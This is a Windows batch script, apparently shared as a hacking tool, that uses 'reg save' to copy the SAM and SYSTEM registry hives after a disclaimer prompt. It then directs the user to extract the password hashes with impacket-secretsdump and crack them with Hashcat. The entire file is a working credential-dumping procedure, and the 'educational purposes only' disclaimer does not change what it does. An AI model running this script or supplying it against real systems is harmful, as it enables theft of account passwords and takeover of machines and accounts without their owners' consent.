@echo off
setlocal
title Windows Password Hash Exporter
echo Please run this batch file as an administrator.
echo READ DISCLAIMER ^-^-^> THIS IS FOR EDUCATIONAL PURPOSES ONLY! DO NOT USE THIS ON SOMEONE ELSES PC WITHOUT THEIR EXPLICIT PERMISSION! THIS IS A HACK! CONTINUE AT YOUR OWN RISK! WE HOLD NO RESPONSIBILITY FOR ANYTHING THAT HAPPEND, IS HAPPENING, AND/OR WILL HAPPEN BECAUSE OF THIS BATCH FILE!
goto :Disclaimer

:Disclaimer
echo.
set /p Disclaimer="Do you agree to the Disclaimer? (Yes/No) "
if /i "%Disclaimer%"=="Yes" goto :Start
if /i "%Disclaimer%"=="No" goto :Exit
echo Invalid Syntax!
goto :Disclaimer

:Start
echo.
set /p HashPath="Where do you want to save the Windows password hashes to? "
if not exist "%HashPath%" goto :HashPathNotExist
md "%HashPath%\Windows Password Hashes"
reg save HKLM\SAM "%HashPath%\Windows Password Hashes\SAM.save"
reg save HKLM\SYSTEM "%HashPath%\Windows Password Hashes\SYSTEM.save"
echo.
echo Use impacket-secretsdump in Kali Linux to extract the hashes from "%HashPath%\Windows Password Hashes". You can then use a tool like Hashcat to crack the hash. Press any key to close this batch file.
goto :Done

:HashPathNotExist
echo %HashPath% does not exist. Please try again.
goto :Start

:Done
endlocal
pause >nul
exit
